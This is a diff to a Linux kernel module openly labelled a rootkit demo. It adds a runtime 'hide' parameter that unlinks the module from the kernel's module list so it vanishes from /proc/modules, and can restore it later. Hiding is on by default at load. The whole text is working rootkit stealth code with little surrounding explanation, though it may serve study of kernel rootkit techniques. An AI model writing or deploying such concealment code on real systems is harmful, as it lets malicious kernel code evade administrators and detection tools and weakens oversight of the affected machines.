@@ -13,13 +13,48 @@
 #include <linux/kernel.h>
 #include <linux/list.h>
 #include <linux/slab.h>
+#include <linux/moduleparam.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Experiment");
 MODULE_DESCRIPTION("Rootkit Hidden Module Demo");
 
+static void hide_module(void);
+static void show_module(void);
+
 /* 保存模块在链表中的前驱节点指针 */
 static struct list_head *prev_module;
+static int module_hidden;
+
+/* 控制是否隐藏模块：1=隐藏，0=显示 */
+static int hide = 1;
+
+static int set_hide(const char *val, const struct kernel_param *kp)
+{
+    int ret;
+
+    ret = param_set_int(val, kp);
+    if (ret)
+        return ret;
+
+    if (hide && !module_hidden) {
+        hide_module();
+        module_hidden = 1;
+    } else if (!hide && module_hidden) {
+        show_module();
+        module_hidden = 0;
+    }
+
+    return 0;
+}
+
+static const struct kernel_param_ops hide_ops = {
+    .set = set_hide,
+    .get = param_get_int,
+};
+
+module_param_cb(hide, &hide_ops, &hide, 0644);
+MODULE_PARM_DESC(hide, "Hide module from /proc/modules (1=hide, 0=show)");
 
 /*
  * hide_module - 从内核模块链表中摘除当前模块
@@ -31,6 +66,9 @@ static struct list_head *prev_module;
  */
 static void hide_module(void)
 {
+    if (module_hidden)
+        return;
+
     /* 保存前驱节点，以便后续恢复 */
     prev_module = THIS_MODULE->list.prev;
     
@@ -38,6 +76,7 @@ static void hide_module(void)
     list_del(&THIS_MODULE->list);
     
     printk(KERN_INFO "rootkit: module hidden from /proc/modules\n");
+    module_hidden = 1;
 }
 
 /*
@@ -48,9 +87,10 @@ static void hide_module(void)
  */
 static void show_module(void)
 {
-    if (prev_module) {
+    if (prev_module && module_hidden) {
         list_add(&THIS_MODULE->list, prev_module);
         printk(KERN_INFO "rootkit: module restored to /proc/modules\n");
+        module_hidden = 0;
     }
 }
 
@@ -58,8 +98,9 @@ static int __init rootkit_init(void)
 {
     printk(KERN_INFO "rootkit: module loaded\n");
     
-    /* 隐藏模块自身 */
-    hide_module();
+    /* 按参数决定是否隐藏 */
+    if (hide)
+        hide_module();
     
     return 0;
 }
